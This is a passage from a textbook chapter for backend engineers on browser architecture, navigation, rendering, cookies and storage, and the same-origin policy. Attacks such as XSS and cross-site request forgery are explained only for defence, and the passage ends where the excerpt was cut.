# Chapter 9: How the Browser Works, and Browser-Side Security

## Where We Are

Chapters 6 to 8 followed bytes between two machines: names resolved by DNS, a TCP connection with its handshake and windows, HTTP messages framed on that connection, and TLS protecting all of it. In every trace, one end was "the client". For most products, that client is a **web browser**, and the browser is far more than a TCP endpoint that sends HTTP. It runs code downloaded from many places, keeps cookies and other state on behalf of many sites, decides which of your responses a page may read, and enforces most of the web's security model.

That matters to a backend engineer for two reasons. First, the browser decides what your server actually receives: which cookies are attached, whether a cross-site request is sent at all, whether a preflight `OPTIONS` request arrives before the real one, what is cached and for how long. Second, several attacks on your users (cross-site scripting, clickjacking, abusing a careless CORS configuration) succeed or fail on decisions your server makes in its responses, even though the attack runs inside the browser.

This chapter explains the browser from the backend's side: how it is built, what happens from the moment a URL is typed to the moment pixels appear, how its JavaScript makes the API calls your server sees, how it stores state, and how its security model works and fails. It ends with the different ways pages can be rendered (on the server, in the browser, or ahead of time) and what each one changes for the backend.

**After this chapter you can:**
- describe the browser's process architecture, its network stack and its caches;
- give the full answer to "what happens when you type a URL and press Enter", from the browser's side, with every network step from Chapters 6–8 in place;
- trace the rendering pipeline from HTML to pixels, and explain why some scripts and stylesheets block rendering and how `async` and `defer` change that;
- explain where a page's API calls come from and what the browser adds to them;
- explain how the browser stores and sends cookies (`Secure`, `HttpOnly`, `SameSite`, scope), and the security trade-offs of `localStorage`, `sessionStorage` and IndexedDB;
- define an origin, and state exactly what the same-origin policy restricts and what it does not;
- trace simple and preflighted CORS requests with their exact headers, including credentialed requests, and recognise the common misconfigurations;
- explain stored, reflected and DOM-based XSS, the precise defence for each, and what a Content Security Policy does;
- defend against clickjacking and set the other security headers deliberately;
- compare server-side rendering, client-side rendering and static generation by what the backend returns, what can be cached, and how authentication works;
- decode a CORS error and a mixed-content error, and read the browser's network timing panel.

**Interview questions this chapter prepares you for:**
1. What happens when you type a URL into the browser and press Enter?
2. How does the browser render a page? What blocks rendering, and what do `async` and `defer` do?
3. Where should a web application store an access token: a cookie, `localStorage`, or memory?
4. What do the cookie attributes `Secure`, `HttpOnly` and `SameSite` do?
5. What is the same-origin policy? What does it restrict, and what does it not?
6. How does CORS work? What is a preflight request, and when is one sent?
7. Why is CORS not a server-side access control?
8. What is XSS? What are stored, reflected and DOM-based XSS, and how do you prevent each?
9. What does a Content Security Policy do?
10. What is clickjacking, and how do you prevent it?
11. What do server-side rendering, client-side rendering and static generation change for the backend?
12. A front-end developer reports a "CORS error". How do you find out what is actually wrong?

**Scope.** Here: the browser's architecture, navigation, rendering, JavaScript's network calls, browser storage and cookie *behaviour*, the same-origin policy, CORS, XSS and CSP, clickjacking and other security headers, rendering strategies as they affect the backend, and browser-side diagnosis. The network underneath is Chapters 6–8 and is only recalled. The *wire syntax* of cookies is Chapter 7 (Section 7.14); sessions and cross-site request forgery (CSRF) are Chapter 19. Authentication and tokens are Chapter 20. CDNs and reverse proxies as components are Chapter 10. Front-end framework internals are out of scope.

---

## 9.1 Browser Architecture

### Definition

A **web browser** is an application that fetches resources over the network, runs the code and markup they contain in an isolated environment, displays the result, and keeps state (cookies, storage, caches) on behalf of each site. Modern browsers are **multi-process**: separate operating-system processes (Chapter 3, Section 3.3) handle the user interface, the network, graphics and the rendering of each site's pages.

### Why it exists in this form

Early browsers ran everything in one process. One misbehaving page could freeze or crash the whole application, and a bug exploited in the code that parsed one page gave an attacker access to every other page's data in the same memory. Splitting the browser into processes uses the operating system's isolation (Chapter 4, Section 4.10): a crash takes down only one process, and a compromised rendering process is confined by the OS and by a **sandbox** that restricts which system calls it may make. After the 2018 **Spectre** attacks showed that code could read memory it was not supposed to by measuring CPU timing (Chapter 2, Section 2.3 explained the caches involved), browsers went further and put different sites in different processes (**site isolation**), so that a page's JavaScript never shares an address space with another site's data.

### Mechanism: the main processes

The details differ between browsers; the structure is common:

```text
 ┌───────────────────────────────────────────────────────────────────────┐
 │ BROWSER PROCESS (one)                                                 │
 │  address bar, tabs, bookmarks, permissions, the decisions about       │
 │  navigation; owns cookies and storage, and hands them out per site    │
 └───────┬───────────────────────────┬───────────────────────────┬───────┘
         │ IPC (Chapter 4, Section 4.8)                          │
 ┌───────▼───────────┐   ┌───────────▼───────────┐   ┌───────────▼───────────┐
 │ NETWORK process   │   │ RENDERER processes    │   │ GPU process           │
 │ (network service) │   │ one or more per site, │   │ draws the composited  │
 │ DNS, TCP, TLS,    │   │ sandboxed: HTML/CSS   │   │ layers to the screen  │
 │ HTTP/1.1, 2, 3;   │   │ parsing, layout,      │   │                       │
 │ connection pools; │   │ JavaScript (one main  │   │                       │
 │ the HTTP cache    │   │ thread per page)      │   │                       │
 └───────────────────┘   └───────────────────────┘   └───────────────────────┘
```

- The **browser process** is trusted. It decides where a navigation goes, which process renders it, and which cookies and storage that process may see.
- The **network process** does all networking. A renderer never opens sockets itself; it asks the network process, which enforces rules (like CORS, Section 9.7) before handing responses back.
- **Renderer processes** run untrusted content: they parse HTML and CSS, run JavaScript, lay out and paint pages. They are sandboxed, and with site isolation each serves pages from one site.
- The **GPU process** composites and draws to the screen (Section 9.3).

### Mechanism: the network stack and its caches

When any part of a page needs a resource, the request goes through the network process, which keeps several caches and pools:

- **DNS cache.** The browser caches name lookups for a short time, on top of the operating system's cache and the resolver's (Chapter 6, Section 6.6). Browsers may also use encrypted DNS (DoH) when configured.
- **HTTP cache** (disk and memory). This is the private cache of Chapter 7 (Section 7.12): it serves fresh responses without any network traffic and revalidates stale ones with `If-None-Match`. Modern browsers **partition** it by the top-level site, so that one site cannot tell whether you visited another by timing how fast a shared resource loads; a library loaded from the same CDN URL by two different sites is therefore downloaded once for each.
- **Connection pools, per origin.** For HTTP/1.1 a browser opens up to about **six** connections to one host at a time (Chapter 7, Section 7.9); further requests queue. For HTTP/2 and HTTP/3 it uses **one** connection per origin and multiplexes every request over it (Chapter 7, Section 7.10). It can even reuse one HTTP/2 connection for several hostnames if they resolve to the same address and the certificate covers all of them (**connection coalescing**). Pools are also partitioned by top-level site.
- **Hints from the page.** A page can ask the browser to start work early: `<link rel="dns-prefetch">` (resolve a name), `rel="preconnect"` (resolve, connect and complete TLS), and `rel="preload"` (fetch a resource the page will need soon). These save round trips before the request is known.

### Guarantees and non-guarantees

The multi-process design guarantees that a crash or a hang in one site's renderer does not take down the others, and, with site isolation, that one site's JavaScript does not run in the same address space as another site's data. It does not make the renderer trustworthy: a renderer can be compromised, which is exactly why the browser process and network process, not the renderer, make security decisions. And none of this protects your users from code that your own site serves (Section 9.8).

### Failure and diagnosis

- **Requests stuck in "Queueing" or "Stalled".** On an HTTP/1.1 site that loads dozens of resources from one host, requests wait for one of the six connections (visible in the timing panel, Section 9.11). Fix: serve over HTTP/2 or HTTP/3, or reduce the number of requests.
- **One heavy tab slows everything.** A page whose JavaScript runs for seconds at a time freezes its own renderer; with process-per-site it should not freeze other sites, but it can still consume CPU and memory the others need. The browser's own task manager shows per-process CPU and memory.

### Backend connection

Three facts from the architecture shape your server's traffic. Browsers open several HTTP/1.1 connections per origin, or one long-lived HTTP/2 connection, so a load balancer sees few, busy connections from each user (Chapter 6, Section 6.13). The browser's HTTP cache only helps if your responses carry correct caching headers (Chapter 7, Section 7.12). And because pools and caches are partitioned by site, a resource served from a third-party domain is not shared across your users' visits to other sites; serving critical assets from your own origin or your own CDN keeps them in the cache that matters.

---

## 9.2 Navigation, End to End

### Definition

A **navigation** is the process by which the browser replaces the document shown in a tab with a new one: from a typed URL, a clicked link, a form submission, a redirect, or a script. A **document** is the page the browser builds from an HTML response; **subresources** are everything that document then loads (stylesheets, scripts, images, fonts, API data).

### Why it matters

"What happens when you type a URL and press Enter?" is the classic question because a good answer walks through every layer of the stack in order: input handling, caches, DNS, TCP, TLS, HTTP, redirects, parsing, rendering and subresources. It shows whether you see the whole system or only one layer of it.

### Mechanism: the timeline

The example: the user types `shop.example.com/orders` and presses Enter. Nothing is cached yet. The path has a 50 ms round-trip time.

```text
 t (ms)  step                                                  details (where it is taught)
 ──────  ────────────────────────────────────────────────────  ─────────────────────────────────────
     0   1. INPUT: is it a URL or a search?                    "shop.example.com/orders" looks like a
                                                               host; no scheme given → assume https
         2. HSTS check                                         if the host is on the HSTS list, the
                                                               browser never tries http (Ch 8, §8.11)
         3. before-unload of the old page; pick a process      the browser process owns the navigation
     1   4. DNS: browser cache → OS cache → resolver           A/AAAA records (Ch 6, §6.6)
    51      → 93.184.216.34 (assume one round trip)
    51   5. TCP handshake to port 443                          SYN, SYN+ACK, ACK (Ch 6, §6.8)
   101
   101   6. TLS 1.3 handshake, SNI = shop.example.com,         certificate validated against the name;
            ALPN offers h2 and http/1.1 → h2 chosen            keys agreed (Ch 8, §8.9)
   151
   151   7. HTTP request                                       GET /orders HTTP/2
            :authority shop.example.com, cookies attached      the browser adds headers (§9.4) and
            (if any match: §9.5), Accept, User-Agent ...       cookies (§9.5)
   216   8. response headers arrive (TTFB)                     server took 15 ms; 50 ms of travel
            302 Found → Location: /login ?                     a redirect repeats steps 7–8 (Ch 7, §7.11)
            or 200 OK, Content-Type: text/html                 the type decides how to handle the body
   216   9. COMMIT: the browser hands the response stream to   the address bar updates; the old page
            a renderer process for this site                   is gone from here on
   216  10. PARSE HTML as it streams in → DOM                  §9.3
            the preload scanner finds <link> and <script>
            and starts fetching them at once on the
            existing connection (no new handshakes)
   270  11. CSS arrives → CSSOM; scripts run                   render-blocking rules: §9.3
   300  12. first render: layout, paint, composite             "first contentful paint"
   300+ 13. images, fonts, and API calls from scripts          many in parallel over the one HTTP/2
            (fetch('/api/orders'))                             connection
   450  14. DOMContentLoaded, then load                        page usable; later API data fills in
```

Several points in this timeline are the backend's business:

- **Steps 4–6 happen only on a cold start.** On a second visit, DNS is cached, and the browser may still hold an open connection, saving 150 ms in this example (the cold-versus-warm budget of Chapter 6, Section 6.12).
- **Step 7 is where the browser decides what your server sees**: which cookies, which headers. Section 9.5 explains the cookie rules; Section 9.4 the headers.
- **Step 8's status code changes everything.** A redirect costs a full extra round trip each time; a chain of `http → https → www → /login` can cost several. The `Content-Type` decides whether the browser renders HTML, downloads a file, or refuses (Section 9.9's `nosniff`).
- **Step 13 is where your API sees traffic.** The HTML document is one request; a modern page then makes many more, most of them from scripts.

### Concrete: the browser's own timing record

Browsers record these steps for every navigation and subresource, in the **Navigation Timing** and **Resource Timing** interfaces that a page's script (or the DevTools panel, Section 9.11) can read. The main timestamps, in order:

```text
 startTime ── redirectStart … redirectEnd ── fetchStart ── domainLookupStart … domainLookupEnd
 ── connectStart … (secureConnectionStart …) connectEnd ── requestStart ── responseStart
 ── responseEnd ── domInteractive ── domContentLoadedEventEnd ── loadEventEnd

 DNS time        = domainLookupEnd − domainLookupStart
 TCP + TLS time  = connectEnd − connectStart   (TLS alone: connectEnd − secureConnectionStart)
 TTFB            = responseStart − requestStart  ← the server's time plus one round trip
 download time   = responseEnd − responseStart
```

Real-user monitoring tools collect exactly these values from users' browsers, which is how you learn what your users experience rather than what your servers measure.

### Guarantees and non-guarantees

A navigation guarantees that the new document comes from the URL in the address bar (after redirects), over TLS when the scheme is `https`, with a certificate valid for that name. It does not guarantee speed (each redirect and each cold handshake adds round trips), and it does not guarantee that everything the page then loads comes from the same place or the same level of trust: a page can pull scripts from other origins, which then run with the page's full powers (Section 9.8).

### Failure and diagnosis

- **Slow first visit, fast second visit.** The difference is cold DNS, TCP and TLS, plus an empty cache. Evidence: the timing panel's DNS, "Initial connection" and SSL segments on the first load. Fixes: `preconnect` hints, fewer distinct origins, HTTP/3, and long cache lifetimes for static assets.
- **Redirect chains.** `http://example.com` → `https://example.com` → `https://www.example.com` → `/home`. Each hop is a full request, often on a new connection. Evidence: several `3xx` rows at the top of the network panel. Fix: redirect straight to the final URL, and use HSTS so the first hop disappears.

### Backend connection

The navigation's critical path runs through your servers twice: once for the HTML document (its TTFB) and again for whatever API calls the page needs before it can show useful content. Keep the document fast and cacheable where possible, avoid redirect chains, and remember that every distinct origin the page uses (an API subdomain, a separate CDN host, an analytics domain) can cost a DNS lookup and a handshake on a cold visit.

---

## 9.3 The Rendering Pipeline

### Definitions

The **DOM** (Document Object Model) is the tree of objects the browser builds from HTML: one node per element, attribute and piece of text, which scripts can read and change. The **CSSOM** (CSS Object Model) is the equivalent structure built from stylesheets. The **render tree** combines them: the visible nodes, each with its computed styles. **Layout** (also called reflow) computes each node's position and size. **Paint** turns nodes into lists of drawing operations (text, colours, borders, images). **Compositing** draws separately painted **layers** in the right order to produce the final image, usually on the GPU.

The **critical rendering path** is the sequence of work the browser must finish before it can show the first pixels of content.

### Why it matters

The time to the first useful pixels decides how fast a site *feels*, and it is shaped by what your server sends and in what order: an HTML document that streams early, stylesheets that arrive quickly, scripts that do not block parsing. Many "the API is slow" complaints are really rendering-path problems, and the reverse.

### Mechanism: from bytes to pixels

```text
 HTML bytes ──► tokenizer ──► DOM tree ───┐
                                          ├──► RENDER TREE ──► LAYOUT ──► PAINT ──► COMPOSITE ──► pixels
 CSS bytes  ──► parser    ──► CSSOM tree ─┘    (visible nodes   (geometry:  (draw     (layers drawn
                                                + computed       boxes,      lists     in order,
                                                styles)          positions)  per layer) on the GPU)

 JavaScript can read and change both trees, which can force the later stages to run again
```

1. **Parsing HTML.** The parser reads bytes as they arrive (it does not wait for the whole document) and builds the DOM incrementally. A **preload scanner** runs ahead of the main parser, finds `<link>`, `<script>` and `<img>` tags and starts fetching them early.
2. **Building the CSSOM.** CSS is **render-blocking**: the browser will not render content until the stylesheets that apply to it are loaded and parsed, because rendering with the wrong styles and then re-rendering would show a flash of unstyled content.
3. **Scripts.** A plain `<script src="app.js">` is **parser-blocking**: the parser stops, the script is fetched and run, and only then does parsing continue, because the script might change the document (for example with `document.write`). A script also waits for any stylesheet before it, since it might read styles.
4. **Render tree, layout, paint, composite.** Elements that are not displayed (`display: none`, `<head>`) are left out of the render tree. Layout computes geometry; paint records drawing commands; compositing draws layers. Changing an element's geometry (its width, its position in the flow) triggers layout again for the affected part of the page; changing only its colour triggers paint; changing only properties handled by the compositor (a `transform`, `opacity`) can skip both.

**`async` and `defer`.**

```text
 <script src="a.js">        parse ██████░░░░░░░░░░░░██████████   parser stops while a.js downloads and runs
                            a.js        ▓▓▓▓▓▓▓▓▓▓▓▓█

 <script async src="a.js">  parse ██████████████░░███████████   download in parallel; runs AS SOON AS it
                            a.js     ▓▓▓▓▓▓▓▓▓▓▓█               arrives (pausing the parser briefly);
                                                                order between async scripts not kept

 <script defer src="a.js">  parse ███████████████████████████   download in parallel; runs AFTER parsing
                            a.js     ▓▓▓▓▓▓▓▓▓▓       █         finishes, in document order, before
                                                                DOMContentLoaded
 (▓ download, █ execution; module scripts, type="module", behave like defer by default)
```

Use `defer` for scripts that need the full document and must run in order; `async` for independent scripts such as analytics; and neither for the rare script that must run before the rest of the page parses.

### Concrete: what users perceive

Browsers report several moments of the loading process, and three **Core Web Vitals** are widely used to judge a page:

- **LCP** (Largest Contentful Paint): when the largest piece of content in view (often a hero image or a headline) is painted. It depends on TTFB, on render-blocking resources, and on how fast that element's own resource arrives.
- **INP** (Interaction to Next Paint): how long the page takes to respond visually to a click or key press. It depends on the main thread being free (Section 9.4).
- **CLS** (Cumulative Layout Shift): how much content jumps around as the page loads, typically because images or late-arriving content had no reserved space.

### Guarantees and non-guarantees

The pipeline guarantees that what is painted reflects the DOM and CSSOM at the time of rendering, and that blocking resources are honoured so that content is not shown with the wrong styles. It does not guarantee any order of arrival for resources fetched in parallel, and it does not stop a page's own script from forcing repeated layouts: code that reads a layout property (an element's height) right after changing styles forces the browser to compute layout immediately, and doing that in a loop (**layout thrashing**) can freeze the page.

### Failure and diagnosis

- **A blank screen for seconds, then the whole page at once.** Large render-blocking CSS, or parser-blocking scripts in the `<head>`. Evidence: the DevTools performance panel shows the main thread busy parsing scripts, and the network panel shows those resources on the critical path. Fixes: `defer` scripts, inline the small amount of CSS needed for the first screen, split the rest.
- **Good TTFB, bad LCP.** The server answers in 50 ms, but the largest image is discovered late (for example, only when a script inserts it) or is huge. Fix: let the preload scanner see it in the HTML, or `preload` it; serve compressed, correctly sized images.

### Backend connection

The backend controls the first stages of the pipeline: how soon the first bytes of HTML leave (stream the response instead of buffering it, Chapter 7, Section 7.3), whether critical CSS and scripts are cacheable and served over the same HTTP/2 connection, and whether the HTML already contains the content (server-side rendering, Section 9.10) or must wait for API calls. A fast API behind a slow critical path still looks slow to users.

---

## 9.4 JavaScript in the Browser, and Where API Calls Come From

### Definitions

Each page's JavaScript runs on a single **main thread** in its renderer process, driven by an **event loop** (Chapter 5, Section 5.13): it takes one **task** at a time from its queues (a user event, a timer, a network response), runs it to completion, then runs all queued **microtasks** (promise continuations), and then, roughly once per display frame, gives the rendering pipeline a chance to update the screen. **Web Workers** are separate threads with their own event loops that cannot touch the DOM.

`fetch` (and its older predecessor `XMLHttpRequest`, XHR) is the browser API that lets a script make HTTP requests. Its **credentials mode** decides whether the browser attaches cookies and HTTP authentication to the request: `omit` (never), `same-origin` (only to the page's own origin; the default for `fetch`) or `include` (always, subject to the cookie rules of Section 9.5 and the CORS rules of Section 9.7).

### Why it matters

Your API's traffic is the sum of what every open page's scripts decide to fetch. Understanding the event loop explains why a page freezes while it parses a huge JSON response, why requests arrive in bursts, and why some requests come with cookies and some without.

### Mechanism 1: the event loop in the browser

```text
 main thread (one per page)
 ┌──────────────────────────────────────────────────────────────────────────────┐
 │ task: click handler ─► microtasks ─► (render?) ─► task: fetch response ─► ... │
 └──────────────────────────────────────────────────────────────────────────────┘
       ▲ task queues:  user input, timers, network results, messages
       ▲ microtask queue: promise reactions (.then, await continuations)
       ▲ rendering opportunity about every 16 ms on a 60 Hz display
```

- A task runs to the end; nothing else happens on the main thread meanwhile. A task that takes 300 ms (parsing a 20 MB JSON response, running a slow loop) blocks clicks, typing and rendering for 300 ms. That is what a poor INP measures (Section 9.3).
- `fetch` does not block: it hands the request to the network process and returns a promise. When the response arrives, a task is queued to resolve it. Parsing the body (`await response.json()`) happens on the main thread.
- Moving heavy work to a Web Worker keeps the main thread responsive.

### Mechanism 2: what a script's request looks like on the wire

A script at `https://shop.example.com` runs:

```pseudo
response = await fetch("https://api.example.com/v1/orders?status=open", {
    method: "GET",
    credentials: "include",
    headers: { "Accept": "application/json" }
})
orders = await response.json()
```

What the browser adds, and what your server receives:

```http
GET /v1/orders?status=open HTTP/2
:authority: api.example.com
accept: application/json
origin: https://shop.example.com              ← added by the browser on cross-origin requests
referer: https://shop.example.com/orders      ← subject to the referrer policy (§9.9)
cookie: sid=4f9a1b2c7d                        ← only because credentials: "include", and only
                                                 cookies whose rules allow it (§9.5)
user-agent: Mozilla/5.0 (...)
sec-fetch-site: same-site                     ← metadata headers: where the request came from
sec-fetch-mode: cors                             and what kind of request it is
sec-fetch-dest: empty
```

Three points:

- The script cannot set every header. Headers that would let a page lie about itself (`Origin`, `Cookie`, `Host`, `Referer`, the `Sec-` headers) are **forbidden** to scripts: the browser sets them itself. That is why a server can rely on `Origin` and the `Sec-Fetch-*` headers from browsers (though not from non-browser clients, which can send anything).
- Because the target origin differs from the page's, the browser treats this as a **cross-origin** request and applies CORS before letting the script read the response (Section 9.7).
- `Sec-Fetch-Site` (`same-origin`, `same-site`, `cross-site`, `none`) and `Sec-Fetch-Mode` (`navigate`, `cors`, `no-cors`, ...) tell the server, reliably for modern browsers, where a request came from, which supports server-side defences such as rejecting cross-site requests to sensitive endpoints (Chapter 19).

### Mechanism 3: where API calls come from

A page's traffic to your servers is not only what you think of as "the API":

- the **document** itself (a navigation request, `Sec-Fetch-Mode: navigate`);
- **subresources** referenced by HTML and CSS (scripts, styles, images, fonts);
- **API calls** from scripts (`fetch`, XHR), often several per screen, sometimes polling on a timer;
- **form submissions**, which are navigations, not scripted requests;
- **beacons** sent with `navigator.sendBeacon` when a page is closed (analytics);
- **prefetches** the browser makes on hints from the page, or speculatively.

### Guarantees and non-guarantees

The browser guarantees that it sets `Origin`, `Cookie`, `Referer` and the `Sec-Fetch-*` headers itself, so a page's script cannot forge them. It does not guarantee that a request came from a browser at all: anyone can send the same request with `curl` and any headers. And it does not deliver requests in any particular order, or exactly once: a user who double-clicks, a page that retries after a timeout, or a tab restored after a crash can send the same request twice (Chapter 7, Section 7.15).

### Failure and diagnosis

- **The page freezes when a big response arrives.** Parsing tens of megabytes of JSON on the main thread. Evidence: a long task in the performance panel right after the response. Fix: paginate (Chapter 13), send less, or parse in a worker.
- **A request storm after deploy.** Every open tab's polling loop retries at once after the server restarts, with no backoff. Evidence: request rates spike in lockstep. Fix: jittered backoff in the client (Chapter 24) and server-side rate limits.
- **"My request has no cookies."** A cross-origin `fetch` without `credentials: "include"`, or a cookie whose `SameSite` or `Domain` rules exclude this request (Section 9.5). Evidence: the request headers in the network panel.

### Backend connection

Design APIs for the way browsers call them: requests arrive in parallel bursts per screen, can be duplicated, carry an `Origin` and `Sec-Fetch-*` headers you can use for defence, and carry cookies only when both the script and the cookie's rules allow it. Treat every request as possibly not from a browser at all; the browser's guarantees protect users from other sites, not your server from its clients.

---

## 9.5 Browser Storage: Cookies, Web Storage, IndexedDB

### Definitions

- **Cookies** are small name–value items set by a server (`Set-Cookie`, Chapter 7, Section 7.14) or by script, stored by the browser, and **sent automatically** in a `Cookie` header on matching requests.
- **`localStorage`** is a per-origin key–value store of strings that scripts read and write synchronously; it persists until cleared.
- **`sessionStorage`** is the same, but scoped to one tab and cleared when the tab closes.
- **IndexedDB** is a per-origin, asynchronous, transactional database in the browser, for structured data and large amounts of it (offline apps, caches of API data).

A **site** (as browsers use the word for cookies) is a scheme plus a **registrable domain**: the part of the host name that a registrant controls, one label below a **public suffix** such as `.com`, `.co.in` or `.github.io`. So `https://app.example.com` and `https://api.example.com` are different **origins** (Section 9.6) but the **same site** (`https://example.com`).

### Why it matters

Where the browser keeps state, and when it sends it, decides two things the backend cares about: what arrives with each request (and therefore how users are identified), and what an attacker who gets script running in your page (Section 9.8) or who lures a user to another site (Chapter 19) can steal or trigger.

### Mechanism 1: when the browser sends a cookie

For every request, the browser goes through its cookie jar and attaches each cookie for which **all** of these hold:

1. **Domain matches.** A cookie set without `Domain` is **host-only**: it is sent only to the exact host that set it. With `Domain=example.com`, it is sent to `example.com` and every subdomain. (A server cannot set a cookie for a public suffix or for an unrelated domain.)
2. **Path matches**: the request path equals the cookie's `Path`, or starts with it at a `/` boundary (`Path=/app` matches `/app` and `/app/orders`, but not `/apple`; Chapter 7, Section 7.14).
3. **`Secure`**: if set, only on HTTPS requests.
4. **Not expired** (`Max-Age` or `Expires`; a cookie with neither lives until the browser session ends).
5. **`SameSite` allows this request** (below).
6. **The request's credentials mode allows cookies** (Section 9.4): navigations and same-origin `fetch` send them; a cross-origin `fetch` sends them only with `credentials: "include"`.
7. **The browser's privacy rules allow it.** Browsers increasingly restrict **third-party cookies**, those sent in a request to a site other than the one in the address bar. Policies differ between browsers and have changed over time; many block or partition them by default.

**`SameSite`** controls rule 5, the most important one for security:

| Value | Sent on same-site requests | Sent on cross-site requests |
|---|---|---|
| `Strict` | yes | **never**, not even when the user clicks a link from another site to yours |
| `Lax` | yes | only on **top-level navigations with a safe method** (a user following a link, `GET`); not on cross-site `POST`, `fetch`, images or iframes |
| `None` | yes | yes (requires `Secure`); still subject to third-party cookie rules |

Several major browsers treat a cookie with no `SameSite` attribute as `Lax`; do not rely on defaults, set it explicitly. The reason `SameSite` matters is that cookies are **ambient credentials**: the browser attaches them no matter which site caused the request. That is the root of cross-site request forgery, which Chapter 19 covers in full; `SameSite=Lax` or `Strict` removes most of it.

**`HttpOnly`** hides a cookie from page scripts (`document.cookie` does not show it). The browser still sends it. This limits what an XSS attacker can steal (Section 9.8), but not what they can do: their script can still make requests from the page, and the browser attaches the cookie.

**Cookie prefixes** let a server demand stricter handling: a cookie named `__Host-sid` is accepted only if it has `Secure`, `Path=/` and no `Domain` (so it is bound to exactly one host over HTTPS), and `__Secure-` requires `Secure`.

### Concrete: which requests carry the session cookie

The session cookie is `Set-Cookie: __Host-sid=4f9a; Path=/; Secure; HttpOnly; SameSite=Lax`, set by `https://shop.example.com`.

| Request | Sent? | Why |
|---|---|---|
| user opens `https://shop.example.com/cart` | yes | same host, navigation |
| page's `fetch("/api/cart")` (same origin) | yes | same origin, default credentials mode |
| page's `fetch("https://api.example.com/cart", {credentials: "include"})` | **no** | `__Host-` cookie is host-only; `api.example.com` is a different host |
| user clicks a link on `https://blog.other.test` to `https://shop.example.com/cart` | yes | cross-site, but a top-level `GET` navigation: `Lax` allows it |
| a form on `https://evil.test` posts to `https://shop.example.com/cart/clear` | **no** | cross-site `POST`: `Lax` blocks it |
| `<img src="https://shop.example.com/avatar">` on `https://evil.test` | **no** | cross-site subresource: `Lax` blocks it |
| `http://shop.example.com/cart` | **no** | `Secure`; the browser would upgrade to HTTPS anyway under HSTS |

### Mechanism 2: Web Storage and IndexedDB

| | Cookies | `localStorage` | `sessionStorage` | IndexedDB |
|---|---|---|---|---|
| Scope | domain and path rules above | origin | origin **and** tab | origin |
| Lifetime | until expiry or end of session | until cleared | until the tab closes | until cleared |
| Sent to the server automatically | **yes**, on matching requests | no | no | no |
| Readable by page script | unless `HttpOnly` | yes | yes | yes |
| Capacity | about 4 KB per cookie | a few MB per origin (browser-dependent) | same | much larger, with browser quotas |
| API | header, or `document.cookie` | synchronous | synchronous | asynchronous, transactional |

### Mechanism 3: where to keep a token

A single-page application that calls an API needs to keep some credential. The usual options and their trade-offs:

- **An `HttpOnly`, `Secure`, `SameSite` cookie.** Scripts cannot read it, so a successful XSS cannot copy it out and use it elsewhere. The browser attaches it automatically, which brings cross-site request forgery into play (mitigated by `SameSite` and the defences of Chapter 19). Works best when the API is on the same site as the page.
- **`localStorage` or `sessionStorage`.** Simple, survives reloads (`localStorage`), and is never sent automatically, so CSRF does not apply. But any script running on the origin can read it: one XSS bug, or one compromised third-party script, and the token is copied to an attacker's server and used from anywhere until it expires.
- **In memory only** (a variable in the page's script). Gone on reload, so it is usually combined with a short-lived access token obtained by a refresh mechanism that itself uses an `HttpOnly` cookie. XSS can still use it while the page is open, but cannot persist it.

There is no option that survives an XSS in your own page: the attacker's script runs with the page's powers. Choose the storage to limit **what can be stolen and for how long**, and put most of the effort into preventing XSS (Section 9.8). Chapter 20 covers tokens in full.

### Guarantees and non-guarantees

Cookies guarantee that the browser sends them only where their attributes and its rules allow, and `HttpOnly` guarantees that page scripts cannot read them. Web Storage guarantees isolation between origins. None of them guarantees confidentiality from code running on the same origin, from the user (who can read and edit everything), or from malware on the device. The data is also not reliable storage: users clear it, browsers evict it under storage pressure, and private windows discard it.

### Failure and diagnosis

- **"Login works on one domain, not the other."** The session cookie is host-only (or `__Host-`) on `www.example.com` and the API is on `api.example.com`, or the opposite. Evidence: the Application panel of DevTools lists each cookie with its domain; the request headers in the network panel show whether it was sent. Fix: serve the API under the same host, or scope the cookie deliberately to the parent domain (accepting that every subdomain then receives it).
- **Cookies silently not set.** A `SameSite=None` cookie without `Secure` is rejected; a cookie set on an HTTP page with `Secure` is rejected; a `Domain` that is not a parent of the current host is rejected. DevTools marks rejected `Set-Cookie` headers with the reason.
- **Embedded widget logged out in some browsers.** A widget in an iframe on a customer's site relies on its own third-party cookie, which the browser blocks or partitions. Fix: design embedded flows that do not depend on third-party cookies.

### Backend connection

Your cookie attributes are security decisions made by the server: set `Secure`, `HttpOnly` and an explicit `SameSite` on every session cookie, prefer `__Host-` names for session identifiers, and scope `Domain` only as widely as you must. Keep cookies small, since they are sent with every matching request (Chapter 7, Section 7.6).

---

## 9.6 Origins and the Same-Origin Policy

### Definitions

An **origin** is the triple (**scheme**, **host**, **port**) of a URL. Two URLs have the **same origin** only if all three are identical.

The **same-origin policy** (SOP) is the browser's rule that a document or script from one origin may not **read** data from another origin, or reach into another origin's documents and storage, unless that other origin explicitly allows it.

### Why it exists

You are logged in to your bank in one tab, and you open a page from some other site in another. That page's script can make your browser send requests to the bank, and your browser would attach your bank cookies (subject to Section 9.5's rules). Without the SOP, the script could then **read the responses**: your balance, your statements, anything the bank would show you. The SOP stops that: the browser will make many cross-origin requests, but it will not hand the responses to a script from another origin unless the responding server says so (Section 9.7).

### Mechanism: comparing origins

Compared with `https://shop.example.com/orders` (scheme `https`, host `shop.example.com`, default port `443`):

| URL | Same origin? | Why |
|---|---|---|
| `https://shop.example.com/cart?id=9` | **yes** | path and query do not matter |
| `https://shop.example.com:443/` | **yes** | 443 is the default for `https` |
| `http://shop.example.com/orders` | no | scheme differs |
| `https://shop.example.com:8443/orders` | no | port differs |
| `https://api.example.com/orders` | no | host differs (same **site**, though) |
| `https://example.com/orders` | no | host differs; parent domains are not the same origin |
| `https://shop.example.co.in/orders` | no | different host, and a different site |

### Mechanism: what the SOP restricts, and what it does not

The single most misunderstood point: the SOP mostly restricts **reading**, not **sending**.

| Action from a page on origin A, towards origin B | Allowed? |
|---|---|
| **Send** a request: a link, a form `GET` or `POST`, an `<img>`, a `<script src>`, a `fetch` | **yes**, the request is sent (cookies attached per Section 9.5) |
| **Embed** B's resources: show an image, run a script, apply a stylesheet, load B in an `<iframe>` | **yes** (B can forbid framing, Section 9.9) |
| **Read** B's response from script (`fetch`, XHR) | **no**, unless B's response allows it with CORS (Section 9.7) |
| **Read or change** the DOM of an `<iframe>` showing B | **no** |
| **Read** B's cookies, `localStorage`, IndexedDB | **no** |
| **Read** the pixels of B's image drawn on a canvas, or B's script source | **no** (the canvas becomes "tainted"; the script runs but its text is not readable) |
| **Exchange messages** with a B window or iframe that agrees | **yes**, through `postMessage`, if each side checks the other's origin |

Two consequences:

